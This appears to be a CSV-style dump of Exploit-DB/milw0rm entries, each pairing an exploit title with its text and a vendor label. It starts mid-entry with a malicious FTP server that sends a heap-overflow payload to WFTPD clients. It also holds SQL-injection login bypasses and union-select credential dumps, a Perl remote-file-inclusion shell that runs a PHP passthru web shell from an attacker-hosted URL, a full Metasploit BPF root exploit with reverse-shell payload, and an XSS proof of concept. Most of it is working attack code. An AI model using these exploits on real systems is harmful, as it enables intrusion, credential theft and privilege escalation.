""r\n""  req = (         ""USER"",         ""PASS"",         ""TYPE"",         ""PWD"",         ""PASV"",         ""LIST""         )          res = (         ""331 Password required.\r\n"",         ""230 User logged in.\r\n"",         ""200 Type set to I.\r\n"",         ""257 '/' is current directory.\r\n"",         ""227 Entering Passive Mode (127,0,0,1,100,100).\r\n"",         ""150 Opening ASCII mode data connection for file list.\r\n"",         )  def parser(buff):      cmd  = buff.split(""\x20"")[0]     cmd1 = buff.split(""\r\n"")[0]     if len(cmd) > len(cmd1):     	cmd = cmd1      for i in range(len(req)):         if req[i] == cmd:             return res[i]      def multiserv(port1, port2):      control = socket(AF_INET, SOCK_STREAM)     control.bind(('', port1))     control.listen(1)          trans =  socket(AF_INET, SOCK_STREAM)     trans.bind(('', port2))     trans.listen(1)      while(1):         cclient, caddr = control.accept()         print ""[*] Connected: "", caddr         cclient.send(""220 Welcome: Evil Secure FTPD 1.666\r\n"")                  while(1):                          r0 = cclient.recv(1024)             print ""[>] Input: %s"" % (r0)             r1 = parser(r0)             if r1 == None:                 r1 = ""502 Command not implemented.\r\n""             cclient.send(r1)             print ""[<] Output: %s"" % (r1)             if r1 == res[4]:                 print ""[*] Data mode\n""                 tclient, taddr = trans.accept()                 print ""[*] Connected: "", taddr             if r1 == res[5]:                 print ""[*] b00mb!""                 tclient.send(heapb0f)                 print ""[*] done""                 break 	break                                                      multiserv(21, 25700)  # milw0rm.com [2007-12-18]",WFTPD,1
7004,Pre Simple CMS - Authentication Bypass  Pre Simple CMS (Auth Bypass) SQL Injection Vulnerability ___________________________________  Author: Hussin X  Home :  www.IQ-TY.com  & www.TrYaG.cc  MaiL : darkangeL_G85@Yahoo.CoM ___________________________________  script    : http://www.preproject.com/projectDetail.asp?projectID=240  _____  ExploiT _______  http://www.uaebis.com/cms/siteadmin/adminlogin.php  exploit > Bypass ______________  user : admin ' or ' 1=1 pass: hussin-X      Greetz : All my freind     Im IraQi        |         Im TrYaGi  # milw0rm.com [2008-11-05],.IQ-TY.,1
46715,"Microsoft Windows 10 1809 - LUAFV LuafvCopyShortName Arbitrary Short Name Privilege Escalation Windows: LUAFV LuafvCopyShortName Arbitrary Short Name EoP Platform: Windows 10 1809 (not tested earlier) Class: Elevation of Privilege Security Boundary (per Windows Security Service Criteria): User boundary  Summary:   The LUAFV driver bypasses security checks to copy short names during file virtualization which can be tricked into writing an arbitrary short name leading to EoP.  Description:  When creating a virtualized file in LuafvCopyFile one of the things that the driver copies across is the short name of the original file by calling LuafvCopyShortName. This uses the FileShortNameInformation information class to set the short name, however the problem with using this is it normally requires SeRestorePrivilege to be enabled, which a non-administrator won’t have access to. Therefore to bypass the privilege check the virtualized file is reopened without security checks, which results in the check being ignored.  The code looks roughly like the following:  NSTATUS LuafvCopyShortName(PFLT_INSTANCE Instance,                                                       PFILE_OBJECT ReadObject,                                                       HANDLE WriteHandle) {   HANDLE FileHandle;   PFILE_OBJECT WriteObject;   NTSTATUS = FltCreateFileEx2(           LuafvDriverData,           Instance,           &FileHandle,           &WriteObject,           FILE_WRITE_ATTRIBUTES,           ...,           IO_NO_PARAMETER_CHECKING);   FILE_NAME_INFORMATION Name = {};   if (NT_SUCCESS(status)) {     if (NT_SUCCESS(FltQueryInformationFile(Instance, ReadHandle, &Name, sizeof(Name),                               FileAlternateNameInformation))) {         status = FltSetInformationFile(Instance, WriteObject,              &Name, IoStatusBlock.Information, FileShortNameInformation);      }   }   return status; }  We can see in the code the writable file is re-opened with new access and without specifying IO_FORCE_ACCESS_CHECK. As FILE_OPEN_FOR_BACKUP_INTENT is specified then NTFS will mark this file as having restore privilege, even though the caller doesn’t, as the previous mode will be KernelMode. The original file is then queried for its alternate name (which is really its short name) and the short name is set through the FileShortNameInformation which will now succeed due to the way the file handle was opened.  Of course the question is how would you get this code to write an arbitrary short name? Although it’s not obvious if the name of the file is already a short name (as in a 8.3 DOS compatible name) then FileAlternateNameInformation doesn’t fail but returns the normal file name back to the caller. Therefore we can exploit this as follows:  1) Create a file with the arbitrary short name inside a directory which is virtualized, ProgramData is ideal for this as we can create arbitrary files. Make the file writeable only to administrators. 2) Open the file for virtualization, but don’t do anything to cause delayed virtualization to occur. 3) Use some symbolic tricks in the VirtualStore directory to cause the creation of that file to be redirected to a long name which would normally have an auto-generated short name. 4) Force the delayed virtualization to occur, the file with the long name will be created, however the short name will be read from the source file which has an arbitrary name. The short name is written bypassing security checks.  There’s probably other ways of doing this without symbolic link tricks, for example there’s a race between the time the file is opened and when the short name is queries. As the file is opened with FILE_SHARE_DELETE it should be possible to rename the source file between the initial open but before reading the short name.  What you could do with this ability is another matter. You could possibly trick some parsing operation which is relying on short names. Or you could create a directory which had two “normal” names rather than one auto generated one which could trick certain things. At any rate the EoP is the fact we can do this without needing SeRestorePrivilege.  I’m not going to speculate on how to fix this, as said while you might be able to block mount point traversal (seems unlikely as the user’s profile could be on a remote share or another drive) there’s probably other ways around this.   Proof of Concept:  I’ve provided a PoC as a C# project. It will create an arbitrary file with an arbitrary short file name.  1) Compile the C# project. It’ll need to pull NtApiDotNet from NuGet to build. 2) As a normal user run the PoC passing the name of the target file to create (with a long file name) and the arbitrary short file name.  Expected Result: The virtualization operation fails.  Observed Result: The virtualization operation succeeds and the file has an arbitrary short name.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46715.zip",Microsoft,1
31579,"Titan FTP Server 10.32 Build 1816 - Directory Traversal ""Titan FTP Server Directory Traversal Vulnerabilities""   ******************************************************************************   - Affected Vendor: South River Technologies - Affected System: Titan FTP Server software (Version 10.32 Build 1816) - Vendor Disclosure Date: January 27th, 2014 - Public Disclosure Date: February 10h, 2014 - Vulnerabilities' Status: Fixed   ******************************************************************************   Associated CVEs:   1) CVE-2014-1841:    It is possible to copy the complete home folder of another user by leveraging a vulnerability on the Titan FTP Server Web Interface.   2) CVE-2014-1842:    It is possible to obtain the complete list of existing users by writing ""/../"" on the search bar.   3) CVE-2014-1843:    It is possible to observe the ""Properties"" for an existing user home folder.    This also allows for enumeration of existing users on the system.   Associated CWE:     CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')   http://cwe.mitre.org/data/definitions/22.html   ******************************************************************************   DESCRIPTIONS ============   1) CVE-2014-1841:      It is possible to copy the complete home folder of another user by leveraging a vulnerability on the Titan FTP Server Web Interface.        This is done by using the ""Move"" function, and replacing the ""src"" parameter value with the ""/../<folder name of another user>"" value.      2) CVE-2014-1842:      It is possible to obtain the complete list of existing users by writing ""/../"" on the search bar and hitting the ""Go"" button.   3) CVE-2014-1843:      It is possible to observe the ""Properties"" for an existing user home folder.        This also allows for enumeration of existing users on the system.        This is done by using the ""Properties"" function, and replacing the ""src"" parameter value with the ""/../<folder name of another user>"" value.      ******************************************************************************   - Available fix:   Titan FTP Server software (Version 10.40 Build 1829):    + titanftp32_10_40_1829_en.exe    + titanftp64_10_40_1829_en.exe   - Related Links: Deloitte Argentina - www.deloitte.com/ar   - Feedback:   If you have any questions, comments, concerns, updates or suggestions please contact:    + Fara Rustein      frustein@deloitte.com (Twitter: @fararustein)    + Luciano Martins      lmartins@deloitte.com (Twitter: @clucianomartins)   ******************************************************************************   Credits:   CVE-2014-1841:   1. It is possible to copy the complete home folder of another user by leveraging a vulnerability on the Titan FTP Server Web Interface.   Discovered by Fara Rustein - frustein@deloitte.com   CVE-2014-1842:   2. It is possible to obtain the complete list of existing users by writing ""/../"" on the search bar.   Discovered by Luciano Martins - lmartins@deloitte.com   CVE-2014-1843:   3. It is also possible to observe the ""Properties"" for an existing user home folder.   This also allows for enumeration of existing users on the system.   Discovered by Fara Rustein - frustein@deloitte.com    ******************************************************************************   Fara Rustein | Senior Consultant Cyber Security - Deloitte The key is searching. Vs nfv zphz qsui ghzf zg xhv yvzqy gj tiwap.    Deloitte se refiere a una o más de las firmas miembros de Deloitte Touche Tohmatsu Limited, una compañía privada del Reino Unido limitada por garantía, y su red de firmas miembros, cada una como una entidad única e independiente y legalmente separada. Una descripción detallada de la estructura legal de Deloitte Touche Tohmatsu Limited y sus firmas miembros puede verse en el sitio web http://www.deloitte.com/about.                           La información de este mail es confidencial y concierne únicamente a la persona a quien está dirigida. Si este mensaje no está dirigido a usted, por favor tenga presente que no tiene autorización para leer el resto de este e-mail, copiarlo o derivarlo a cualquier otra persona que no sea aquella a quien está dirigido. Si recibe este mail por error, por favor, avise al remitente, luego de lo cual rogamos a usted destruya el mensaje original. No se puede responsabilizar de ningún modo a Deloitte & Co. S.A. ni a sus subsidiarias por cualquier consecuencia o daño que pueda resultar del apropiado y completo envío y recepción del contenido de este e-mail.   Deloitte refers to one or more of Deloitte Touche Tohmatsu Limited, a UK private company limited by guarantee, and its network of member firms, each of which is a legally separate and independent entity. Please see http://www.deloitte.com/about for a detailed description of the legal structure of Deloitte Touche Tohmatsu Limited and its member firms.  The information in this e-mail is confidential and intended solely for the person to whom it is addressed. If this message is not addressed to you, please be aware that you have no authorization to read the rest of this e-mail, to copy it or to furnish it to any person other than the addressee. Should you have received this e-mail by mistake, please bring this to the attention of the sender, after which you are kindly requested to destroy the original message. Deloitte & Co. S.A. and subsidiaries cannot be held responsible or liable in any way whatsoever for and/or in connection with any consequences and/or damage resulting from the proper and complete dispatch and receipt of the content of this e-mail.",southrivertech,1
7615,"Flexphpsite 0.0.1 - Authentication Bypass ############################################# Autore: x0r Email: andry2000@hotmail.it Site: http://w00tz0ne.altervista.org/index.php Cms: Flexphpsiteen Version: 0.0.1 Download: http://www.china-on-site.com/flexphpsite/downloads.html ##############################################  Bug In \admin\usercheck.php  $sql = ""select username,adminid from linkexadmin where username='$checkuser' and password='$checkpass'"";  Exploit:   Go to /[path]/admin/index.php Put as username and password the following sql code: ' or '1=1  Greetz: Anna <3  # milw0rm.com [2008-12-29]",Flexphpsite,1
12689,"Apache Axis2 Administration Console - (Authenticated) Cross-Site Scripting PR10-03 Authenticated Cross-Site Scripting Vulnerability (XSS) within Apache Axis2 administration console   Source: http://www.procheckup.com/vulnerability_manager/vulnerabilities/pr10-03  Advisory publicly released:  Friday, 21 May 2010 Vulnerability found:  Saturday, 30 January 2010 Severity level:  Medium  Credits Richard Brain of ProCheckUp Ltd (www.procheckup.com)  Description: Axis2 is a web services/SOAP/WDSL engine, widely used within many commercial products Procheckup has found it is vulnerable to a vanilla Cross-Site Scripting Vulnerability (XSS).  Axis2 is used within SAP Business Objects 12 and 3com's IMC network management tool.  http://ws.apache.org/axis2/  Comfirmed vulnerable versions: 1.4.1  Proof of concept:  The following demonstrate the XSS flaw:  Authenticated XSS normally login as admin and axis2  http://target-domain.foo:8080/imcws/axis2-admin/axis2-admin/axis2-web/axis2-admin/axis2-admin/engagingglobally? submit=%2bEngage%2b&modules=<script>alert(1)</script>  Note: The above path will change depending on how axis2 has been installed.   Legal Copyright 2010 Procheckup Ltd. All rights reserved.  Permission is granted for copying and circulating this Bulletin to the Internet community for the purpose of alerting them to problems, if and only if, the Bulletin is not edited or changed in any way, is attributed to Procheckup, and provided such reproduction and/or distribution is performed for non-commercial purposes.  Any other use of this information is prohibited. Procheckup is not liable for any misuse of this information by any third party.",.procheckup.,0
2606,"CASTOR 1.1.1 - '/lib/rs.php' Remote File Inclusion #!/usr/bin/perl # # CASTOR <= 1.1.1 Remote Command Execution Vulnerability #  # Risk : High (Remote Code Execution) #  # Url: svn.gna.org/svn/castor/trunk  # # Exploit:  #   http://www.site.com/[path]/lib/rs.php?rootpath=[Evil_Script] #  # (c)oded and f0und3d by Kw3[R]Ln <ciriboflacs[AT]YaHOo.com> # #  Romanian Security Team .: hTTp://RST-CREW.NET :. # # Shoutz to [Oo], str0ke, th0r and all members of RST !  use LWP::Simple;  print ""...........................[RST]...............................\n""; print "".                                                             .\n""; print "".  CASTOR <= 1.1.1 Remote Command Execution Vulnerability     .\n""; print "".                                                             .\n""; print ""...............................................................\n""; print "".       Romanian Security Team -> hTTp://RST-CREW.NET         .\n""; print "".       [c]oded by Kw3rLN - kw3rln[AT]rst-crew.net            .\n"";  print ""...............................................................\n\n"";  my $kw3,$path,$shell,$conexiune,$cmd,$data ;   if ((!$ARGV[0]) || (!$ARGV[1])) { &usage;exit(0);}  $path = $ARGV[0]; chomp($path); $shell = $ARGV[1];	 chomp($shell);      $path = $path.""/lib/rs.php"";   sub usage(){ 	print ""Usage    : perl $0 host/path http://site.com/cmd.txt\n\n""; 	print ""Example  : perl $0 http://127.0.0.1 http://site.com/cmd.txt\n\n"";         print 'Shell    : <?php ob_clean();ini_set(""max_execution_time"",0);passthru($_GET[""cmd""]);die;?>';            }  while ()   {   print ""[kw3rln].[rst] :~\$ ""; chomp($cmd=<STDIN>); if ($cmd eq ""exit"") { exit(0);}  $kw3 = $path.""?rootpath="".$shell.""?&cmd="".$cmd;  if ($cmd eq """")        { print ""Enter your command !\n""; } else    { $data=get($kw3); print $data ; }  }  # milw0rm.com [2006-10-21]",castor_project,1
11334,"Audistats 1.3 - SQL Injection ###################################################################################                                                                                   # [~] Audistats SQL injection vulnerability - (mday)                                #  [~] Author	: kaMtiEz (kamzcrew@yahoo.com)                                    # [~] Homepage	: http://www.indonesiancoder.com                                  # [~] Date	: January 29, 2010                                                #                                                                                   # ###################################################################################  [ Software Information ]  [+] Vendor : http://adubus.free.fr/audistat/ [+] Download : http://adubus.free.fr/audistat/ [+] version : 1.3 or lower maybe also affected [+] Vulnerability : SQL injection [+] Dork : ""Think iT"" [+] Price : -             [+] Location : INDONESIA - JOGJA  ##################################################################################   [ HERE WE GO .. LIVE FROM JOGJA CITY ]  [ Vulnerable File ]  http://127.0.0.1/[kaMtiEz]/?year=kaMtiEz&month=tukulesto&mday=[INDONESIANCODER]  [ Exploit ]  -666+union+all+select+@@version,user()--  [ Example ]  http://[server]/stats/?year=kaMtiEz&month=tukulesto&mday=-15+union+all+select+@@version,user()--  ===========================================================================  [ Thx TO ]  [+] INDONESIAN CODER TEAM KILL-9 CREW KIRIK CREW MainHack ServerIsDown SurabayaHackerLink IndonesianHacker SoldierOfAllah [+] tukulesto,M3NW5,arianom,tiw0L,abah_benu,d0ntcry,newbie_043,bobyhikaru,gonzhack [+] Contrex,onthel,yasea,bugs,Ronz,Pathloader,cimpli,MarahMerah,ibl13Z [+] Coracore,Gh4mb4s,Jack-,VycOd,m0rgue a.k.a mbamboenk,r3m1ck  [ NOTE ]   [+] Belajar Belajar Dan Belajar !! [+] Jack im commiinnggggggggggggggggggggggggggggggggg .. ^_^  [ QUOTE ]  [+] we are not dead INDONESIANCODER stil r0x [+] nothing secure ..",.indonesiancoder.,1
40759,"Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (Metasploit) ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core'  class MetasploitModule < Msf::Exploit::Local   Rank = GoodRanking    include Msf::Exploit::EXE   include Msf::Post::File   include Msf::Exploit::FileDropper    def initialize(info={})     super( update_info( info, {         'Name'          => 'Linux BPF Local Privilege Escalation',         'Description'   => %q{           Linux kernel >=4.4 with CONFIG_BPF_SYSCALL and kernel.unprivileged_bpf_disabled           sysctl is not set to 1, BPF can be abused to priv escalate.           Ubuntu 16.04 has all of these conditions met.         },         'License'       => MSF_LICENSE,         'Author'        =>           [             'jannh@google.com',                    # discovery             'h00die <mike@shorebreaksecurity.com>' # metasploit module           ],         'Platform'      => [ 'linux' ],         'Arch'          => [ ARCH_X86, ARCH_X86_64 ],         'SessionTypes'  => [ 'shell', 'meterpreter' ],         'References'    =>           [             [ 'CVE', '2016-4557' ],             [ 'EDB', '39772' ],             [ 'URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=808' ],             [ 'URL', 'https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7' ]           ],         'Targets'       =>           [             [ 'Linux x86',       { 'Arch' => ARCH_X86 } ],             [ 'Linux x64',       { 'Arch' => ARCH_X86_64 } ]           ],         'DefaultOptions' =>           {             'payload' => 'linux/x64/mettle/reverse_tcp',             'PrependFork' => true,             'WfsDelay' => 60 # we can chew up a lot of CPU for this, so we want to give time for payload to come through             },         'DefaultTarget' => 1,         'DisclosureDate' => 'May 04 2016',         'Privileged'     => true       }       ))     register_options([         OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ]),         OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', ['Auto', 'True', 'False']]),         OptInt.new('MAXWAIT', [ true, 'Max seconds to wait for decrementation in seconds', 120 ])       ], self.class)   end    def check     def check_config_bpf_syscall?()       output = cmd_exec('grep CONFIG_BPF_SYSCALL /boot/config-`uname -r`')       if output == 'CONFIG_BPF_SYSCALL=y'         vprint_good('CONFIG_BPF_SYSCALL is set to yes')         return true       else         print_error('CONFIG_BPF_SYSCALL is NOT set to yes')         return false       end     end      def check_kernel_disabled?()       output = cmd_exec('sysctl kernel.unprivileged_bpf_disabled')       if output != 'kernel.unprivileged_bpf_disabled = 1'         vprint_good('kernel.unprivileged_bpf_disabled is NOT set to 1')         return true       else         print_error('kernel.unprivileged_bpf_disabled is set to 1')         return false       end     end      def check_fuse?()       lib = cmd_exec('dpkg --get-selections | grep ^fuse')       if lib.include?('install')         vprint_good('fuse is installed')         return true       else         print_error('fuse is not installed.  Exploitation will fail.')         return false       end     end      def mount_point_exists?()       if directory?('/tmp/fuse_mount')         print_error('/tmp/fuse_mount should be unmounted and deleted.  Exploitation will fail.')         return false       else         vprint_good('/tmp/fuse_mount doesn\'t exist')         return true       end     end      if check_config_bpf_syscall?() && check_kernel_disabled?() && check_fuse?() && mount_point_exists?()       CheckCode::Appears     else       CheckCode::Safe     end   end    def exploit      def upload_and_compile(filename, file_path, file_content, compile=nil)       rm_f ""#{file_path}""       if not compile.nil?         rm_f ""#{file_path}.c""         vprint_status(""Writing #{filename} to #{file_path}.c"")         write_file(""#{file_path}.c"", file_content)         register_file_for_cleanup(""#{file_path}.c"")         output = cmd_exec(compile)         if output != ''           print_error(output)           fail_with(Failure::Unknown, ""#{filename} at #{file_path}.c failed to compile"")         end       else         vprint_status(""Writing #{filename} to #{file_path}"")         write_file(file_path, file_content)       end       cmd_exec(""chmod +x #{file_path}"");       register_file_for_cleanup(file_path)     end      doubleput = %q{       #define _GNU_SOURCE       #include <stdbool.h>       #include <errno.h>       #include <err.h>       #include <unistd.h>       #include <fcntl.h>       #include <sched.h>       #include <signal.h>       #include <stdlib.h>       #include <stdio.h>       #include <string.h>       #include <sys/types.h>       #include <sys/stat.h>       #include <sys/syscall.h>       #include <sys/prctl.h>       #include <sys/uio.h>       #include <sys/mman.h>       #include <sys/wait.h>       #include <linux/bpf.h>       #include <linux/kcmp.h>        #ifndef __NR_bpf       # if defined(__i386__)       #  define __NR_bpf 357       # elif defined(__x86_64__)       #  define __NR_bpf 321       # elif defined(__aarch64__)       #  define __NR_bpf 280       # else       #  error       # endif       #endif        int uaf_fd;        int task_b(void *p) {         /* step 2: start writev with slow IOV, raising the refcount to 2 */         char *cwd = get_current_dir_name();         char data[2048];         sprintf(data, ""* * * * * root /bin/chown root:root '%s'/suidhelper; /bin/chmod 06755 '%s'/suidhelper\n#"", cwd, cwd);         struct iovec iov = { .iov_base = data, .iov_len = strlen(data) };         if (system(""fusermount -u /home/user/ebpf_mapfd_doubleput/fuse_mount 2>/dev/null; mkdir -p fuse_mount && ./hello ./fuse_mount""))           errx(1, ""system() failed"");         int fuse_fd = open(""fuse_mount/hello"", O_RDWR);         if (fuse_fd == -1)           err(1, ""unable to open FUSE fd"");         if (write(fuse_fd, &iov, sizeof(iov)) != sizeof(iov))           errx(1, ""unable to write to FUSE fd"");         struct iovec *iov_ = mmap(NULL, sizeof(iov), PROT_READ, MAP_SHARED, fuse_fd, 0);         if (iov_ == MAP_FAILED)           err(1, ""unable to mmap FUSE fd"");         fputs(""starting writev\n"", stderr);         ssize_t writev_res = writev(uaf_fd, iov_, 1);         /* ... and starting inside the previous line, also step 6: continue writev with slow IOV */         if (writev_res == -1)           err(1, ""writev failed"");         if (writev_res != strlen(data))           errx(1, ""writev returned %d"", (int)writev_res);         fputs(""writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.\n"", stderr);         while (1) sleep(1); /* whatever, just don't crash */       }        void make_setuid(void) {         /* step 1: open writable UAF fd */         uaf_fd = open(""/dev/null"", O_WRONLY|O_CLOEXEC);         if (uaf_fd == -1)           err(1, ""unable to open UAF fd"");         /* refcount is now 1 */          char child_stack[20000];         int child = clone(task_b, child_stack + sizeof(child_stack), CLONE_FILES | SIGCHLD, NULL);         if (child == -1)           err(1, ""clone"");         sleep(3);         /* refcount is now 2 */          /* step 2+3: use BPF to remove two references */         for (int i=0; i<2; i++) {           struct bpf_insn insns[2] = {             {               .code = BPF_LD | BPF_IMM | BPF_DW,               .src_reg = BPF_PSEUDO_MAP_FD,               .imm = uaf_fd             },             {             }           };           union bpf_attr attr = {             .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,             .insn_cnt = 2,             .insns = (__aligned_u64) insns,             .license = (__aligned_u64)""""           };           if (syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr)) != -1)             errx(1, ""expected BPF_PROG_LOAD to fail, but it didn't"");           if (errno != EINVAL)             err(1, ""expected BPF_PROG_LOAD to fail with -EINVAL, got different error"");         }         /* refcount is now 0, the file is freed soon-ish */          /* step 5: open a bunch of readonly file descriptors to the target file until we hit the same pointer */         int status;         int hostnamefds[1000];         int used_fds = 0;         bool up = true;         while (1) {           if (waitpid(child, &status, WNOHANG) == child)             errx(1, ""child quit before we got a good file*"");           if (up) {             hostnamefds[used_fds] = open(""/etc/crontab"", O_RDONLY);             if (hostnamefds[used_fds] == -1)               err(1, ""open target file"");             if (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, uaf_fd, hostnamefds[used_fds]) == 0) break;             used_fds++;             if (used_fds == 1000) up = false;           } else {             close(hostnamefds[--used_fds]);             if (used_fds == 0) up = true;           }         }         fputs(""woohoo, got pointer reuse\n"", stderr);         while (1) sleep(1); /* whatever, just don't crash */       }        int main(void) {         pid_t child = fork();         if (child == -1)           err(1, ""fork"");         if (child == 0)           make_setuid();         struct stat helperstat;         while (1) {           if (stat(""suidhelper"", &helperstat))             err(1, ""stat suidhelper"");           if (helperstat.st_mode & S_ISUID)             break;           sleep(1);         }         fputs(""suid file detected, launching rootshell...\n"", stderr);         execl(""./suidhelper"", ""suidhelper"", NULL);         err(1, ""execl suidhelper"");       }     }      suid_helper = %q{       #include <unistd.h>       #include <err.h>       #include <stdio.h>       #include <sys/types.h>        int main(void) {         if (setuid(0) || setgid(0))           err(1, ""setuid/setgid"");         fputs(""we have root privs now...\n"", stderr);         execl(""/bin/bash"", ""bash"", NULL);         err(1, ""execl"");       }      }      hello = %q{       /*         FUSE: Filesystem in Userspace         Copyright (C) 2001-2007  Miklos Szeredi <miklos@szeredi.hu>         heavily modified by Jann Horn <jannh@google.com>          This program can be distributed under the terms of the GNU GPL.         See the file COPYING.          gcc -Wall hello.c `pkg-config fuse --cflags --libs` -o hello       */        #define FUSE_USE_VERSION 26        #include <fuse.h>       #include <stdio.h>       #include <string.h>       #include <errno.h>       #include <fcntl.h>       #include <unistd.h>       #include <err.h>       #include <sys/uio.h>        static const char *hello_path = ""/hello"";        static char data_state[sizeof(struct iovec)];        static int hello_getattr(const char *path, struct stat *stbuf)       {         int res = 0;         memset(stbuf, 0, sizeof(struct stat));         if (strcmp(path, ""/"") == 0) {           stbuf->st_mode = S_IFDIR | 0755;           stbuf->st_nlink = 2;         } else if (strcmp(path, hello_path) == 0) {           stbuf->st_mode = S_IFREG | 0666;           stbuf->st_nlink = 1;           stbuf->st_size = sizeof(data_state);           stbuf->st_blocks = 0;         } else           res = -ENOENT;         return res;       }        static int hello_readdir(const char *path, void *buf, fuse_fill_dir_t filler, off_t offset, struct fuse_file_info *fi) {         filler(buf, ""."", NULL, 0);         filler(buf, "".."", NULL, 0);         filler(buf, hello_path + 1, NULL, 0);         return 0;       }        static int hello_open(const char *path, struct fuse_file_info *fi) {         return 0;       }        static int hello_read(const char *path, char *buf, size_t size, off_t offset, struct fuse_file_info *fi) {         sleep(10);         size_t len = sizeof(data_state);         if (offset < len) {           if (offset + size > len)             size = len - offset;           memcpy(buf, data_state + offset, size);         } else           size = 0;         return size;       }        static int hello_write(const char *path, const char *buf, size_t size, off_t offset, struct fuse_file_info *fi) {         if (offset != 0)           errx(1, ""got write with nonzero offset"");         if (size != sizeof(data_state))           errx(1, ""got write with size %d"", (int)size);         memcpy(data_state + offset, buf, size);         return size;       }        static struct fuse_operations hello_oper = {         .getattr	= hello_getattr,         .readdir	= hello_readdir,         .open		= hello_open,         .read		= hello_read,         .write		= hello_write,       };        int main(int argc, char *argv[]) {         return fuse_main(argc, argv, &hello_oper, NULL);       }     }      hello_filename = 'hello'     hello_path = ""#{datastore['WritableDir']}/#{hello_filename}""     doubleput_file = ""#{datastore['WritableDir']}/doubleput""     suidhelper_filename = 'suidhelper'     suidhelper_path = ""#{datastore['WritableDir']}/#{suidhelper_filename}""     payload_filename = rand_text_alpha(8)     payload_path = ""#{datastore['WritableDir']}/#{payload_filename}""      if check != CheckCode::Appears       fail_with(Failure::NotVulnerable, 'Target not vulnerable! punt!')     end      def has_prereqs?()       def check_libfuse_dev?()         lib = cmd_exec('dpkg --get-selections | grep libfuse-dev')         if lib.include?('install')           vprint_good('libfuse-dev is installed')           return true         else           print_error('libfuse-dev is not installed.  Compiling will fail.')           return false         end       end       def check_gcc?()         gcc = cmd_exec('which gcc')         if gcc.include?('gcc')           vprint_good('gcc is installed')           return true         else           print_error('gcc is not installed.  Compiling will fail.')           return false         end       end       def check_pkgconfig?()         lib = cmd_exec('dpkg --get-selections | grep ^pkg-config')         if lib.include?('install')           vprint_good('pkg-config is installed')           return true         else           print_error('pkg-config is not installed.  Exploitation will fail.')           return false         end       end       return check_libfuse_dev?() && check_gcc?() && check_pkgconfig?()     end      compile = false     if datastore['COMPILE'] == 'Auto' || datastore['COMPILE'] == 'True'       if has_prereqs?()         compile = true         vprint_status('Live compiling exploit on system')       else         vprint_status('Dropping pre-compiled exploit on system')       end     end      if compile == false       # doubleput file       path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2016-4557', 'doubleput')       fd = ::File.open( path, ""rb"")       doubleput = fd.read(fd.stat.size)       fd.close       # hello file       path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2016-4557', 'hello')       fd = ::File.open( path, ""rb"")       hello = fd.read(fd.stat.size)       fd.close       # suidhelper file       path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2016-4557', 'suidhelper')       fd = ::File.open( path, ""rb"")       suid_helper = fd.read(fd.stat.size)       fd.close        # overwrite with the hardcoded variable names in the compiled versions       payload_filename = 'AyDJSaMM'       payload_path = '/tmp/AyDJSaMM'     end      # make our substitutions so things are dynamic     suid_helper.gsub!(/execl\(""\/bin\/bash"", ""bash"", NULL\);/,                ""return execl(\""#{payload_path}\"", \""\"", NULL);"") #launch our payload, and do it in a return to not freeze the executable     doubleput.gsub!(/execl\("".\/suidhelper"", ""suidhelper"", NULL\);/,                 'exit(0);')     print_status('Writing files to target')     cmd_exec(""cd #{datastore['WritableDir']}"")     upload_and_compile('hello', hello_path, hello, compile ? ""gcc -o #{hello_filename} #{hello_filename}.c -Wall -std=gnu99 `pkg-config fuse --cflags --libs`"" : nil)     upload_and_compile('doubleput', doubleput_file, doubleput, compile ? ""gcc -o #{doubleput_file} #{doubleput_file}.c -Wall"" : nil)     upload_and_compile('suidhelper', suidhelper_path, suid_helper, compile ? ""gcc -o #{suidhelper_filename} #{suidhelper_filename}.c -Wall"" : nil)     upload_and_compile('payload', payload_path, generate_payload_exe)      print_status('Starting execution of priv esc.  This may take about 120 seconds')      cmd_exec(doubleput_file)     sec_waited = 0     until sec_waited > datastore['MAXWAIT'] do       Rex.sleep(1)       # check file permissions       if cmd_exec(""ls -lah #{suidhelper_path}"").include?('-rwsr-sr-x 1 root root')         print_good('got root, starting payload')         print_error('This exploit may require process killing of \'hello\', and \'doubleput\' on the target')         print_error('This exploit may require manual umounting of /tmp/fuse_mount via \'fusermount -z -u /tmp/fuse_mount\' on the target')         print_error('This exploit may require manual deletion of /tmp/fuse_mount via \'rm -rf /tmp/fuse_mount\' on the target')         cmd_exec(""#{suidhelper_path}"")         return       end       sec_waited +=1     end   end    def on_new_session(session)     # if we don't /bin/bash here, our payload times out     # [*] Meterpreter session 2 opened (192.168.199.131:4444 -> 192.168.199.130:37022) at 2016-09-27 14:15:04 -0400     # [*] 192.168.199.130 - Meterpreter session 2 closed.  Reason: Died     session.shell_command_token('/bin/bash')     super   end end",linux,1
5723,"Joomla! Component equotes 0.9.4 - SQL Injection /---------------------------------------------------------------\ \                                				/ /        Joomla Component equotes  Remote SQL injection         \ \                                				/ \---------------------------------------------------------------/   [*] Author    :  His0k4 [ALGERIAN HaCkEr]  [*] Dork      :  inurl:com_eQuotes  [*] POC        : http://localhost/[Joomla_Path]/index.php?option=com_equotes&id={SQL}  [*] Example    : http://localhost/[Joomla_Path]/index.php?option=com_equotes&id=13 and 1=1 union select user(),concat(username,0x3a,password),user(),user(),user(),user(),user() FROM jos_users--                   ---------------------------------------------------------------------------- [*] Greetings :  Str0ke, all friends & muslims HaCkeRs...  # milw0rm.com [2008-06-02]",Joomla!,1
